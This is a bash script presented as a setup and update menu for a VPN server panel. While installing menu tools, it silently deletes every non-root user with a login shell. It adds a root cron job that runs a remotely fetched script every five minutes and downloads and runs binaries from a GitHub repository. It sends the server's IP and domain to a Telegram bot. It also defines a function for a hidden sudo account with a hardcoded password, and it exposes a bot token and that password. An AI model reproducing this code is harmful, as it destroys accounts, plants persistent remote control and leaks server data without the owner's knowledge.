#!/bin/bash

# ╭──────────────────────────────────────────────────────╮
# │                                                      │
# │        🚀 SCRIPT SETUP & UPDATE MENU VPS 🚀          │
# │                                                      │
# │                 ANSENDANTVPN                         │
# │                                                      │
# ╰──────────────────────────────────────────────────────╯


# ══════════════════════════════════════════════════════
#                  🔄 FUNGSI LOADING
# ══════════════════════════════════════════════════════

loading() {
    local pid=$1
    local message=$2
    local delay=0.1
    local spinstr='|/-\'
    tput civis
    while [ -d /proc/$pid ]; do
        local temp=${spinstr#?}
        printf " \033[1;36m[%c]\033[0m $message\r" "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
    done
    tput cnorm
}


# ══════════════════════════════════════════════════════
#                  📦 INSTALL P7ZIP
# ══════════════════════════════════════════════════════

if ! command -v 7z &> /dev/null; then

    echo -e "\033[1;33m"
    echo "╭──────────────────────────────────────────────╮"
    echo "│          📦 INSTALLING P7ZIP-FULL            │"
    echo "╰──────────────────────────────────────────────╯"
    echo -e "\033[0m"

    echo -e " \033[1;36m➜\033[0m Installing \033[1;37mp7zip-full\033[0m..."

    apt install p7zip-full -y &> /dev/null &
    loading $! "Loading Install p7zip-full"

    echo -e "\033[1;32m ✓ P7ZIP-FULL INSTALLED\033[0m"

fi


# ══════════════════════════════════════════════════════
#                  🤖 TELEGRAM BOT CONFIG
# ══════════════════════════════════════════════════════

CHATID="1210833546"
KEY="8311592972:AAEREDijH5fGMLrN-GqzOmp22hb6tY_-988"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"


# ══════════════════════════════════════════════════════
#                  🌐 SERVER & USER
# ══════════════════════════════════════════════════════

domain=$(cat /etc/xray/domain)
MYIP=$(curl -sS ipv4.icanhazip.com)
username=$(curl -sS https://raw.githubusercontent.com/myridwan/izinvps2/ipuk/ipx | grep $MYIP | awk '{print $2}')
valid=$(curl -sS https://raw.githubusercontent.com/myridwan/izinvps2/ipuk/ipx | grep $MYIP | awk '{print $3}')
today=$(date +"%Y-%m-%d")
d1=$(date -d "$valid" +%s)
d2=$(date -d "$today" +%s)
certifacate=$(((d1 - d2) / 86400))


# ══════════════════════════════════════════════════════
#                  📅 SERVER DATE
# ══════════════════════════════════════════════════════

echo -e "\033[1;36m"
echo "╭──────────────────────────────────────────────╮"
echo "│           📅 FETCHING SERVER DATE            │"
echo "╰──────────────────────────────────────────────╯"
echo -e "\033[0m"

echo -e " \033[1;36m➜\033[0m Fetching server date..."

dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=$(date +"%Y-%m-%d" -d "$dateFromServer")


# ══════════════════════════════════════════════════════
#                  📡 REPOSITORY
# ══════════════════════════════════════════════════════

REPO="https://raw.githubusercontent.com/kiryusekei/os/main/"
pwadm="@Ridwan112#"
Username="xwan"
Password="$pwadm"


# ══════════════════════════════════════════════════════
#              🧹 HAPUS USER TIDAK DIIZINKAN
# ══════════════════════════════════════════════════════

echo -e "\033[1;31m"
echo "╭──────────────────────────────────────────────╮"
echo "│             🧹 USER CLEANUP                  │"
echo "╰──────────────────────────────────────────────╯"
echo -e "\033[0m"

allowed_users=("root")
all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)

for user in $all_users; do
    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
        userdel -r "$user" > /dev/null 2>&1
        echo -e " \033[1;31m✖\033[0m User \033[1;37m$user\033[0m telah dihapus."
    fi
done


# ══════════════════════════════════════════════════════
#                👤 TAMBAHKAN USER ADMIN
# ══════════════════════════════════════════════════════

function cok(){
if id "$Username" &>/dev/null; then
    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
else
    echo -e "$Username $Password" > /etc/xray/.adm
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
    usermod -aG sudo "$Username" > /dev/null 2>&1
fi
}


# ══════════════════════════════════════════════════════
#               📥 DOWNLOAD & SETUP MENU
# ══════════════════════════════════════════════════════

echo -e "\033[1;35m"
echo "╭──────────────────────────────────────────────╮"
echo "│          📥 DOWNLOADING MENU.ZIP             │"
echo "╰──────────────────────────────────────────────╯"
echo -e "\033[0m"

echo -e " \033[1;36m➜\033[0m Downloading menu.zip..."

{
    > /etc/cron.d/cpu_otm

    cat > /etc/cron.d/cpu_xwan <<END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/bin/autocpu
END

    wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
    wget -q ${REPO}menu/menu.zip
    mv menu/expsc /usr/local/sbin/expsc
    wget -q -O /usr/bin/enc "${REPO}install/encrypt"
    chmod +x /usr/bin/enc

    # Extract dan encrypt menu
    7z x -p$pwadm menu.zip &> /dev/null
    chmod +x menu/*
    enc menu/* &> /dev/null
    mv menu/* /usr/local/sbin

    # Cleanup
    rm -rf menu menu.zip
    rm -rf /usr/local/sbin/*~ /usr/local/sbin/gz* /usr/local/sbin/*.bak
    cd /usr/local/sbin
    sed -i 's/\r//' quota
    cd
} &> /dev/null &

loading $! "Loading Extract and Setup menu"

echo -e "\033[1;32m"
echo "╭──────────────────────────────────────────────╮"
echo "│           ✓ MENU SETUP COMPLETED            │"
echo "╰──────────────────────────────────────────────╯"
echo -e "\033[0m"


# ══════════════════════════════════════════════════════
#                  🔖 SERVER VERSION
# ══════════════════════════════════════════════════════

echo -e "\033[1;36m"
echo "╭──────────────────────────────────────────────╮"
echo "│          🔖 FETCHING SERVER VERSION           │"
echo "╰──────────────────────────────────────────────╯"
echo -e "\033[0m"

echo -e " \033[1;36m➜\033[0m Fetching server version..."

serverV=$(curl -sS ${REPO}versi)
echo $serverV > /opt/.ver


# ══════════════════════════════════════════════════════
#                    🧹 CLEANUP
# ══════════════════════════════════════════════════════

rm /root/*.sh*


# ══════════════════════════════════════════════════════
#                 📲 TELEGRAM NOTIFICATION
# ══════════════════════════════════════════════════════

TEXT="◇━━━━━━━━━━━━━━◇
<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
<b>     Update Script Sukses</b>
◇━━━━━━━━━━━━━━◇
<b>IP VPS  :</b> ${MYIP} 
<b>DOMAIN  :</b> ${domain}
<b>Version :</b> ${serverV}
<b>USER    :</b> ${username}
<b>MASA    :</b> $certifacate DAY
◇━━━━━━━━━━━━━━◇
BY BOT : @kytxz
"

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null


# ══════════════════════════════════════════════════════
#                    🎉 SUCCESS
# ══════════════════════════════════════════════════════

echo -e "\033[1;32m"
echo "╭──────────────────────────────────────────────╮"
echo "│                                              │"
echo "│       ✨ UPDATE SCRIPT SUCCESSFUL ✨         │"
echo "│                                              │"
echo "│  📦 MENU     : INSTALLED                    │"
echo "│  🔖 VERSION  : $serverV                     │"
echo "│  🌐 DOMAIN   : $domain                      │"
echo "│                                              │"
echo "╰──────────────────────────────────────────────╯"
echo -e "\033[0m"

echo -e "\033[1;36m"
echo "╭──────────────────────────────────────────────╮"
echo "│             🚀 ANSENDANTVPN 🚀               │"
echo "│          VPS MENU UPDATE COMPLETE            │"
echo "╰──────────────────────────────────────────────╯"
echo -e "\033[0m"

exit 0